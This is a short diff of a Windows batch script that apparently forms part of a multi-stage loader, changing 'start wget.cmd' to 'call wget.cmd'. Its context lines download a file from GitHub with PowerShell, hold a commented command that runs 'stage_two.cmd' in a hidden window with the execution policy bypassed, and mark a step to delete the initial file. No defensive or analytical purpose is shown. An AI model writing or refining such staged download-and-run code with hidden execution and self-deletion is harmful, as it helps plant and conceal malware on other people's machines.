@@ -23,7 +23,7 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Z
 @REM powershell.exe -Command "Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""stage_two.cmd""'"
 
 @REM start wget1.cmd
-start wget.cmd
+call wget.cmd
 @REM delete the intial file
 
 cd %INTIAL_PATH%
